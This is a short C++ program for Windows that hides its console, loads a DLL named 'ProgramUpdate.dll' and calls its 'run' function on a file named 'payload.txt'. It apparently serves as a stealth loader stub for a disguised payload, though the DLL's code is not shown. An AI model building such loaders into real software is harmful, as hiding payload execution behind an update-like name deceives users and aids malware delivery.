#include <windows.h>
#include <iostream>
#include <string>

typedef void (*RunFunc)(const char*);

int main() {
    FreeConsole();
    HMODULE hDll = LoadLibraryA("ProgramUpdate.dll");
    if (!hDll) {
        std::cerr << "Failed to load dll file" << std::endl;
        return 1;
    }
    RunFunc run = (RunFunc)GetProcAddress(hDll, "run");
    if (!run) {
        std::cerr << "Failed to find function in DLL" << std::endl;
        FreeLibrary(hDll);
        return 1;
    }
    std::string payload = "payload.txt";
    run(payload.c_str());
    FreeLibrary(hDll);
    return 0;
}